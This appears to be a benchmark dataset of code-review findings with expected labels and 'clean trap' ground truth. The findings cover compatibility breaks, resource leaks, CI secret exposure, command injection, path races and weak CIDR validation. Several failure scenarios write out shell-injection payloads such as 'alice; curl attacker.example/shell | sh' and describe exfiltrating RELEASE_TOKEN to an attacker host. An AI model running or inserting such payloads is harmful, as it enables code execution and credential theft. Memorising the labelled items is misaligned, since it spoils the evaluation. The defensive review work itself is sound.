findings.body: datetime.utcnow() is deprecated and returns a naive datetime. The previous code used datetime.now(UTC), which is timezone-aware, so fetched_at no longer means UTC and cannot be compared or subtracted with aware datetimes. Restore `from datetime import UTC, datetime` and call datetime.now(UTC).
findings.failure_scenario: Comparing fetched_at with an aware datetime such as datetime.now(UTC) raises TypeError, or a consumer treats the naive value as local time and stores the wrong instant.
findings.title: Record an aware UTC timestamp, not utcnow

findings.body: PurePath(user_id).name is a path canonicalization step applied to a database identity. Any user_id that contains a path separator (or, on the host OS, a drive/root prefix) is reduced to its final component before the lookup, so the bound id is not the value the caller authorized. Parameterization still prevents SQL injection, but the rewrite lets one string resolve to a different users.id than was checked upstream, and PurePath is OS-specific so the same input can map to different ids on Windows vs POSIX.
findings.failure_scenario: An auth check accepts or logs the raw user_id "tenant/alice", then find_user runs the query for "alice" (PurePath.name). A caller who can pass "ignored/admin" or "..\\admin" loads that other row whenever such an id exists.
findings.title: Stop rewriting user ids with PurePath.name

ground_truth.clean_trap: User input still reaches a query, but the statement remains parameterized and path-like prefixes are discarded.

findings.body: The commit claims to preserve fetchUser compatibility, but the default timeoutMs = 30000 is removed. Callers that pass only an id now get undefined instead of a 30s timeout.
findings.failure_scenario: A caller that invokes fetchUser(id) previously received timeoutMs 30000; it now receives undefined, so any wait or abort that uses that value either never fires or treats the request as already expired.
findings.title: Restore the default timeoutMs of 30000

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: The return value is no longer { id, timeoutMs, fetchedAt }. It is a two-element array, and fetchedAt uses deprecated Date#toGMTString (RFC 1123) instead of toISOString. That contradicts the stated compatibility refactor and breaks every caller that reads object fields or parses an ISO timestamp.
findings.failure_scenario: A caller that does const user = fetchUser(id); user.id or Date.parse(user.fetchedAt) now sees an array: user.id is undefined and the timestamp format no longer matches ISO-8601, so identity and time checks fail or throw.
findings.suggestion: return { id, timeoutMs, fetchedAt: new Date().toISOString() };
findings.title: Return the original object with an ISO timestamp

findings.body: enrich used to return every item from repository.loadMany. It now adds an item only when item.active, item.owner is non-null, and item.owner.enabled are all true, so inactive items and items with a missing or disabled owner disappear from the result with no error.

findings.title: Stop dropping items that fail the nested checks

findings.body: The loop awaits repository.load once per id, so latency stacks with list length and one thrown load aborts the whole call after earlier loads already succeeded. The previous loadMany path fetched the set together.
findings.failure_scenario: With dozens of ids, enrich waits for N serial round-trips; if any load throws, the caller gets an error and none of the items already fetched are returned.
findings.title: Load ids in one batch instead of awaiting each load

findings.body: ResultListFactory has one caller and only returns an empty List<Item>. Delete the class and construct the list at the call site.
findings.title: Allocate the result list directly

findings.body: ResultListFactory and enrich are public surfaces added or rewritten in this change, and neither has a doc comment. The new enrich signature still looks like a bulk load, but it now silently drops inactive items and items with a null or disabled owner; callers cannot see that contract from the declaration.
findings.title: Document the public ResultListFactory and enrich contract

findings.body: render now returns rows.subList(1, rows.size()) instead of the original list, but the updated test only calls assertNotNull. That passes for any non-null list, so a regression that returns the full list, an empty list, or the wrong slice would still go green. Restore an equality check against the expected tail.

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The PreparedStatement is created and then only the ResultSet is returned. On the success path the statement stays open for as long as the caller holds the ResultSet, and if executeQuery throws the statement is abandoned with no close. Do not wrap it in try-with-resources around the return — that closes the statement and invalidates the ResultSet. The caller needs a way to close both, or this method should consume the row and close the statement itself.
findings.failure_scenario: Repeated find calls leave server-side statements open until the connection is closed, and under load the pool hits the driver's open-statement limit and later queries fail.
findings.title: PreparedStatement is never closed

findings.body: Each call allocates a PreparedStatement that is never closed, and the caller only receives the ResultSet, so it cannot close the statement either. Closing the ResultSet does not release the statement. On a repository lookup path those handles accumulate until the connection or driver cursor limit is hit.
findings.failure_scenario: Under repeated find() calls the unclosed statements exhaust the connection's open-cursor or statement limit, and later queries fail with a resource-exhausted SQLException.
findings.title: Close the PreparedStatement after the query

ground_truth.clean_trap: User-controlled text reaches a SQL operation only through PreparedStatement.setString, so it cannot alter query syntax.

findings.body: Switching the trigger to pull_request_target runs this job in the base repository context, where secrets are available, and the checkout then uses the PR head SHA. npm test therefore executes attacker-controlled package scripts and test code with RELEASE_TOKEN in the environment. A fork PR can exfiltrate that token (and any other secret this job can read) even though workflow permissions only grant contents: read. Keep pull_request for untrusted checkouts, or check out the base ref and do not pass secrets into steps that run PR code.
findings.failure_scenario: An attacker opens a pull request whose test script prints or posts RELEASE_TOKEN to an external host. The pull_request_target job checks out that commit and runs npm test, so the secret is stolen and can be used to publish or modify releases.
findings.title: Stop running untrusted PR code with secrets on pull_request_target

findings.body: pull_request_target runs in the base repository with access to secrets, and the job checks out github.event.pull_request.head.sha before npm test. That SHA is attacker-controlled on a fork PR, so the test script (and anything it invokes) executes with RELEASE_TOKEN in the environment.
findings.failure_scenario: A fork PR changes the npm test script to print or exfiltrate process.env.RELEASE_TOKEN. The workflow checks out that commit and runs npm test, leaking the release token to the attacker.
findings.title: Do not run untrusted PR code with secrets

expected.label: pull_request_target executes untrusted head with a secret

findings.body: execSync runs its argument through a shell. userName is concatenated into that string, so any shell metacharacter in the name is executed. The previous spawnSync call passed the name as a separate argv element and did not invoke a shell. Restore an argument-array spawn (and change the import back to spawnSync from node:child_process) so the name cannot be interpreted as shell syntax.
findings.failure_scenario: A caller passes userName such as `alice; curl attacker.example/shell | sh`. execSync runs that in the shell and executes the injected command with the process privileges.
findings.title: Stop interpolating userName into an execSync shell command

findings.body: execSync throws on a non-zero exit. spawnSync returned a status object and still let renderReport return rows, so a failing report binary now prevents any result from being returned.
findings.failure_scenario: When the report binary is missing or exits non-zero, execSync throws and the caller never receives rows.
findings.title: Do not let a failed report command abort the return

findings.body: rows.slice(1) drops the first element, so the report is no longer the input list. That contradicts the commit intent to keep report output stable for named users; the previous return was the full rows value.

findings.body: The return value changed from an object `{ id, timeoutMs, fetchedAt }` to a two-element array, and `fetchedAt` is now a GMT string from the deprecated `toGMTString()` instead of an ISO-8601 string. Callers that read `.id`, `.timeoutMs`, or `.fetchedAt`, or that parse an ISO timestamp, no longer get those fields.
findings.failure_scenario: A caller that does `const user = await fetchUser(id); user.id` receives undefined because the value is an array, and any ISO date parser rejects the GMT string, so user records fail to load or display the wrong time.
findings.suggestion: return { id, timeoutMs, fetchedAt: new Date().toISOString() };
findings.title: Keep fetchUser returning an object with an ISO timestamp

findings.body: The prefix check and File::open are separate syscalls on a path string. canonicalize only proves the path was inside root at that instant; File::open walks the path again and follows symlinks. Replacing the checked file (or a parent directory) with a symlink after the check and before open escapes the root.
findings.failure_scenario: A writer swaps root/report for a symlink to a file outside root after strip_prefix succeeds and before File::open; the caller receives that outside file.
findings.title: Open under the root without a check-then-open race

findings.body: root.join(name).canonicalize() stats the joined path before strip_prefix runs. Path::join drops root when name is absolute, so an arbitrary name is resolved on the filesystem first. A missing target returns NotFound from canonicalize; an existing target fails later as PermissionDenied, so the two error kinds disclose whether paths outside the report root exist.
findings.failure_scenario: open_report(root, "/etc/passwd") returns PermissionDenied when that file exists and NotFound when a similarly absolute path does not, letting a caller probe arbitrary paths.
findings.title: Do not canonicalize untrusted paths before the jail check

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.

findings.body: The commit says this refactor preserves UserClient caller compatibility, but fetch no longer returns User and no longer accepts a nullable Integer timeout with a 30000 default. Callers compiled against the previous contract will not compile, and null timeouts that used to be defaulted are rejected or unbox to NPE.
findings.failure_scenario: A caller that does User u = client.fetch(id, null) fails to compile (or NPEs on unbox) instead of receiving a User with the previous 30000 ms default.
findings.title: Restore the User return type and nullable timeout

findings.body: The new body calls Map.entry and declares Map.Entry, but the only import added is java.util.Date. java.util.Map is not in java.lang, so this file does not compile.
findings.failure_scenario: javac fails on Map.Entry and Map.entry with cannot find symbol, so UserClient cannot be built or called.
findings.title: Import java.util.Map before using Map.entry

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: The previous constructor argument was the timeout in milliseconds (defaulting null to 30000). This now passes Date.toGMTString(), which is deprecated and returns a String, so the timeout is never applied to the user. If User still takes an int timeout, this also fails to compile.
findings.failure_scenario: fetch("u1", 5000) builds the user from a GMT date string and ignores 5000, so any timeout-based behavior on User is wrong or the call does not compile.
findings.title: Pass the timeout into User, not a GMT string

findings.body: pull_request_target runs in the base repository context and can read secrets, but the job checks out github.event.pull_request.head.sha (attacker-controlled PR head, including forks) and then runs npm test with RELEASE_TOKEN in the environment. A PR can change package.json scripts or test code so that npm test reads that token and exfiltrates it. Use pull_request for untrusted code, and never pass secrets into a step that executes the PR head.
findings.failure_scenario: An attacker opens a pull request whose npm test script prints or posts RELEASE_TOKEN; the workflow checks out that commit under pull_request_target and the secret is stolen from the base repo.
findings.title: Stop running untrusted PR code with repository secrets

findings.body: RELEASE_TOKEN is passed into the same step that runs npm test after checking out the pull request head. Under pull_request_target that step executes attacker-controlled package scripts with the secret in the process environment, so the token can be read and sent off-box. Remove this env binding from any job that checks out or runs PR head code.
findings.failure_scenario: A malicious PR replaces the test script with one that reads process.env.RELEASE_TOKEN and exfiltrates it during npm test, compromising the release credential.
findings.title: Do not inject RELEASE_TOKEN into untrusted npm test

findings.body: pull_request_target runs in the base repository with access to secrets, and this step checks out github.event.pull_request.head.sha, which is attacker-controlled on a fork PR. The following npm test step then executes that untrusted tree with RELEASE_TOKEN in the environment, so a PR can read the secret and use it however the token is scoped.
findings.failure_scenario: A fork PR adds a test script that prints or exfiltrates process.env.RELEASE_TOKEN; the workflow checks out that commit and runs npm test, leaking the release token.
findings.title: Do not check out PR head under pull_request_target

findings.body: The new validation only rejects the exact string "0.0.0.0/0", so it does not enforce the stated "admin access cannot be public" policy. Any other value, including 0.0.0.0/1, 128.0.0.0/1, and other prefixes wider than a private admin range, is accepted and written straight into the port-22 ingress rule. There is also no check that the value is a valid CIDR.
findings.failure_scenario: A tfvars or CI override sets admin_cidr to 0.0.0.0/1 (or another near-global prefix). Plan succeeds because the string is not exactly 0.0.0.0/0, and SSH on the security group is then reachable from half the internet.
findings.title: Reject broad CIDRs on the SSH admin rule

findings.body: admin_cidr is a new module input and has no description, so callers only see the type, default, and a validation error. A description should state that it is the IPv4 CIDR allowed to reach SSH and that 0.0.0.0/0 is rejected.

  type        = string
  default     = "10.20.0.0/16"
findings.title: Document the new admin_cidr input

findings.body: PurePath(user_id).name is path semantics, not an identity check. It drops every component before the last slash (and, on Windows, backslash), so the parameterized query no longer looks up the id the caller supplied. Distinct ids that share a final segment collapse to one row, and a value such as "other/admin" resolves to "admin". The query placeholder already prevents SQL injection; stripping the id is not a sanitizer and should be removed, along with the PurePath import.
findings.failure_scenario: An attacker passes user_id "victim/admin" (or "..\\admin" on Windows). find_user loads the admin row instead of the literal id, so any authorization that trusted the original string now returns another user's record.

findings.body: userName is concatenated into a string passed to execSync, which runs it through a shell. The previous spawnSync call passed the name as a separate argv element and did not invoke a shell. Any metacharacters in userName (`;`, `|`, `$()`, backticks, newlines) are now interpreted by the shell as additional commands. Restore an argument-array API (spawnSync or execFileSync) and change the import back from execSync; do not build a shell command string.
findings.failure_scenario: A caller passes userName such as `alice; curl attacker.example/shell.sh | sh`. execSync runs that string in a shell, so the extra command executes with the process privileges and can exfiltrate data or run arbitrary code.
findings.title: Stop interpolating userName into a shell command

findings.body: std::mem::uninitialized() invents a UserRecord without initializing it. That is instant undefined behavior for any type with a Drop impl, references, or non-zero niches, and UserRecord::merge is then handed that value. If merge reads or moves those fields, leftover stack bytes (including secrets or dangling pointers) are treated as a live record.

findings.title: Remove uninitialized memory from the user record path

findings.body: The confinement check resolves `name` with `canonicalize` and only afterwards calls `File::open` on that path. Those are separate syscalls, so a directory component under `root` can be swapped for a symlink after the prefix check succeeds and before the open. `strip_prefix` then no longer describes the file that is actually read. Open relative to a directory file descriptor (for example `cap-std` / `openat` with `O_NOFOLLOW`) and reject absolute paths and `..` components up front instead of checking a resolved path and re-opening it by name.
findings.failure_scenario: If another user can write under `root`, they replace a subdirectory with a symlink to `/` between `canonicalize` and `File::open`; `open_report` returns a file outside `root` even though `strip_prefix` succeeded.
findings.title: Close the canonicalize-then-open TOCTOU

findings.body: `root.join(name).canonicalize()` stats whatever path `name` builds, including absolute paths and `..` sequences, before `strip_prefix` runs. `canonicalize` returns `NotFound` when the target is missing and succeeds (then the next line returns `PermissionDenied`) when it exists, so the two errors are an existence oracle for any path the process can traverse. Reject absolute `name` values and `..` components before any filesystem access, and map both failure modes to the same error if a resolved-path check remains.
findings.failure_scenario: A caller passes `../../etc/shadow` or an absolute path; `NotFound` versus `PermissionDenied` tells them whether that path exists without the open being allowed.
findings.title: Do not canonicalize untrusted names before confinement

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.

findings.anchor: (Map<String, Object?>, int) fetchUser(String id, int timeoutMs) {
findings.body: The commit says this refactor keeps fetchUser callers compatible, but the signature does the opposite: the return type changes from Map<String, Object?> to a record, and the optional timeoutMs (default 30000) becomes a required positional argument. Existing call sites that pass only an id, or that treat the result as a map, no longer type-check or run.
findings.failure_scenario: A caller that still does fetchUser(id) or reads result['id'] fails to compile, or at runtime gets a record instead of the map keys timeoutMs and fetchedAt.
findings.title: Keep the Map return and optional timeoutMs

findings.body: user is concatenated into a string executed by /bin/sh -c. The previous ProcessBuilder call passed user as a separate argv element and did not invoke a shell. Any shell metacharacter in user is now interpreted by the shell, so this is OS command injection.
findings.failure_scenario: A caller passes user as "alice; curl attacker.example/shell | sh". Runtime.exec runs that string under /bin/sh -c, so the extra command executes with the service process privileges.
findings.title: Stop interpolating user into a shell command

findings.body: subList(1, rows.size()) drops the first row and throws when the list has fewer than two elements (fromIndex 1 is past the end, or greater than toIndex). The commit says rows are preserved; this returns a shorter view of the caller's list instead.
findings.failure_scenario: render("alice", List.of()) throws IllegalArgumentException, and render("alice", List.of("only")) returns an empty list, so the only row is discarded.
findings.title: Return the full row list

findings.body: returnsRows only checks that render returns a non-null list. The production change now drops the first row via subList and shells out with the user string, and this assertion passes for the old full list, an empty list, or any other non-null result, so neither behavior is guarded.
findings.title: Assert the dropped-first-row contract, not just non-null

findings.anchor: func FetchUser(id string, timeout time.Duration) (User, time.Duration) {
findings.body: The commit says this refactor preserves FetchUser caller compatibility, but the signature changes from (id string, timeout *time.Duration) User to (id string, timeout time.Duration) (User, time.Duration). Callers that pass a *time.Duration and expect a single User no longer compile, which is the opposite of a compatibility-preserving change.
findings.failure_scenario: Existing callers that pass a timeout pointer and assign the single User return fail to compile after this change.
findings.title: Keep the old FetchUser signature

findings.body: Reading defaults.json and discarding both the bytes and the error is unrelated to preserving FetchUser's contract. A missing or unreadable file is silently ignored, and the contents never affect the returned User or timeout.
findings.failure_scenario: If defaults.json is absent or unreadable, ReadFile's error is discarded and FetchUser still returns the input id and timeout unchanged, so the read cannot implement any defaults behavior.
findings.title: Drop the unused defaults.json read

findings.body: pull_request_target runs in the base repository with secret access, and the job checks out github.event.pull_request.head.sha (the PR head, including fork code) before npm test. A pull request can change package.json scripts or test files so that npm test reads RELEASE_TOKEN and exfiltrates it. Use pull_request (no secrets) for untrusted code, or keep pull_request_target only for trusted base-repo code and never check out the PR head in a job that receives secrets.
findings.failure_scenario: An attacker opens a PR from a fork that replaces the test script with a curl of process.env.RELEASE_TOKEN to their server. The workflow checks out that SHA and runs npm test with the secret, so the token is stolen and can be used to publish releases.
findings.title: Stop exposing RELEASE_TOKEN to untrusted PR code

findings.body: Switching the trigger from pull_request to pull_request_target executes this workflow with the base repository's privileges. Combined with checkout of the PR head SHA, any code in the pull request becomes the code that runs in that privileged context. Revert the trigger to pull_request unless the job only touches trusted base-branch files and does not execute PR-controlled scripts.
findings.failure_scenario: A fork PR modifies the checked-out tree; the privileged workflow runs that tree's npm test, giving the attacker code execution inside the base repo's CI with access to injected secrets.
findings.title: Do not run untrusted PR heads on pull_request_target

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The new validation only rejects the exact string "0.0.0.0/0". Any other value, including 0.0.0.0/1, 128.0.0.0/1, a public /8, or a non-CIDR string, is accepted and written into the port-22 ingress rule. That check therefore does not enforce the error message "Admin access cannot be public." Require a parseable IPv4 CIDR whose prefix is at least as narrow as the previous /16 default.
findings.failure_scenario: An operator sets admin_cidr to 0.0.0.0/1 (or any public prefix other than the literal 0.0.0.0/0). Terraform applies the rule and SSH on port 22 is reachable from half or all of the internet.
findings.title: Reject public and overly broad SSH CIDRs

findings.body: admin_cidr is a new module input and has no description. Callers cannot tell from the interface that it is the SSH source CIDR, or that the validation rejects only the literal 0.0.0.0/0.

description = "IPv4 CIDR allowed to reach SSH (port 22). Must not be 0.0.0.0/0."
  type        = string
findings.title: Document the admin_cidr variable
